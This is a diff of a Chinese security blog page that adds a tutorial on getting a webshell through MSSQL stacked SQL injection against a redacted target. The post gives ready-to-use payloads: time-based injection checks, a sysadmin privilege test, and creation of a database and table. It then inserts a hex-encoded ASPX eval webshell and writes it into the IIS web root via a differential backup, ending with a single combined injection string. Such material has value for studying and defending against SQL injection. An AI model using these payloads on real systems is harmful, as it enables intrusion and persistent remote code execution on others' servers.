@@ -6,17 +6,28 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Conan-blog | ConanStudio</title>
+  <title>mssqlDBA差异备份getshell | ConanStudio</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="title: Conan博客date: 2019-10-29 15:38:50tags:今天开始第一次学习记录更新~">
+  <meta name="description" content="发现注入点 https:&#x2F;&#x2F;xx.xxx.xxx.xxx&#x2F;xxxx&#x2F;xxxxxxx.html?id=1 支持堆叠查询 延时注入 获取数据库很慢 抓包进行手工注入  判断注入点 id=1后面  id=1’;WAITFOR DELAY ‘0:0:5’– repeater发包需要url编码  权限判断 id=1’;if ( select IS_SRVROLEMEMBER(‘sysadmin’))=1 W">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Conan-blog">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;10&#x2F;29&#x2F;Conan-blog&#x2F;index.html">
+<meta property="og:title" content="mssqlDBA差异备份getshell">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;13&#x2F;mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell&#x2F;index.html">
 <meta property="og:site_name" content="ConanStudio">
-<meta property="og:description" content="title: Conan博客date: 2019-10-29 15:38:50tags:今天开始第一次学习记录更新~">
+<meta property="og:description" content="发现注入点 https:&#x2F;&#x2F;xx.xxx.xxx.xxx&#x2F;xxxx&#x2F;xxxxxxx.html?id=1 支持堆叠查询 延时注入 获取数据库很慢 抓包进行手工注入  判断注入点 id=1后面  id=1’;WAITFOR DELAY ‘0:0:5’– repeater发包需要url编码  权限判断 id=1’;if ( select IS_SRVROLEMEMBER(‘sysadmin’))=1 W">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-10-29T08:42:37.259Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell&#x2F;4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell&#x2F;5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell&#x2F;6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell&#x2F;7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell&#x2F;8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell&#x2F;9.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell&#x2F;10.png">
+<meta property="og:updated_time" content="2019-12-13T02:23:38.530Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell&#x2F;1.png">
   
     <link rel="alternative" href="/atom.xml" title="ConanStudio" type="application/atom+xml">
   
@@ -156,28 +167,71 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Conan-blog" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-mssqlDBA差异备份getshell" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Conan-blog
+      mssqlDBA差异备份getshell
     </h1>
   
 
         
-        <a href="/2019/10/29/Conan-blog/" class="archive-article-date">
-  	<time datetime="2019-10-29T07:38:50.046Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-29</time>
+        <a href="/2019/12/13/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/" class="archive-article-date">
+  	<time datetime="2019-12-13T02:03:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-12-13</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <hr>
-<p>title: Conan博客<br>date: 2019-10-29 15:38:50<br>tags:<br>今天开始第一次学习记录更新~</p>
+        <p>发现注入点</p>
+<p><a href="https://xx.xxx.xxx.xxx/xxxx/xxxxxxx.html?id=1" target="_blank" rel="noopener">https://xx.xxx.xxx.xxx/xxxx/xxxxxxx.html?id=1</a></p>
+<p>支持堆叠查询</p>
+<p>延时注入 获取数据库很慢</p>
+<p>抓包进行手工注入</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/1.png" alt="img"></p>
+<p>判断注入点 id=1后面 </p>
+<p>id=1’;WAITFOR DELAY ‘0:0:5’–</p>
+<p>repeater发包需要url编码</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/2.png" alt="img"></p>
+<p>权限判断</p>
+<p>id=1’;if ( select IS_SRVROLEMEMBER(‘sysadmin’))=1 WAITFOR DELAY ‘0:0:5’–</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/3.png" alt="img"></p>
+<p>延时5秒以上 说明是dba权限</p>
+<p>使用差异备份将一句话木马写入数据库</p>
+<p>首先</p>
+<p>id=1’;create database test1 –</p>
+<p>create database test1  #创建一个名为test1的数据库</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/4.png" alt="img"></p>
+<p>再test1数据库里创建一张表</p>
+<p>id=1’;create table test1.dbo.cmd(cmd varchar(1000)) –</p>
+<p>create table test1.dbo.cmd(cmd varchar(1000))   #创表</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/5.png" alt="img"></p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/6.png" alt="img"></p>
+<p>成功创建库和表</p>
+<p>盲注的情况下可以通过完整备份数据库到已知路径下查看是否成功</p>
+<p>本站中间件为IIS 所以尝试使用IIS默认安装路径 C:\inetpub\wwwroot\</p>
+<p>完整备份 </p>
+<p>执行</p>
+<p>id=1’;Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.zip’ –</p>
+<p>Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.zip’   #完整备份</p>
+<p>在建立的表里插入十六进制编码的一句话木马</p>
+<p>id=1’;insert into test1.dbo.cmd VALUES(0x3C25402050616765204C616E67756167653D224A73637269707422253E3C256576616C28526571756573742E4974656D5B2267225D2C22756E7361666522293B253E) –</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/7.png" alt="img"></p>
+<p>insert into test1.dbo.cmd VALUES(0x3C25402050616765204C616E67756167653D224A73637269707422253E3C256576616C28526571756573742E4974656D5B2267225D2C22756E7361666522293B253E)  #插入一句话</p>
+<p>最后使用差异备份将木马写入数据库内</p>
+<p>id=1’;Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.aspx’ with differential –</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/8.png" alt="img"></p>
+<p>查看写入情况</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/9.png" alt="img"></p>
+<p>Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.aspx’ with differential  #差异备份</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/10.png" alt="img"></p>
+<p>完成后去连接一句话木马</p>
+<p>‘;create table test1.dbo.cmd(cmd varchar(1000));Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.zip’;insert into test1.dbo.cmd VALUES(0x3C25402050616765204C616E67756167653D224A73637269707422253E3C256576616C28526571756573742E4974656D5B2267225D2C22756E7361666522293B253E);Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.aspx’ with differential –</p>
+<p>可以一次性执行</p>
 
       
 
@@ -257,7 +311,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/10/29/Conan-blog/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/12/13/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -271,15 +325,20 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/12/12/Linux%E5%8F%8D%E5%90%91ssh%E9%9A%A7%E9%81%93/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2019/12/13/Linux%E5%8F%8D%E5%BC%B9%E5%8F%8A%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          Linux反向ssh隧道
+          Linux反弹及定时任务
         
       </div>
     </a>
   
+  
+    <a href="/2019/12/12/Linux%E5%8F%8D%E5%90%91ssh%E9%9A%A7%E9%81%93/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Linux反向ssh隧道</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
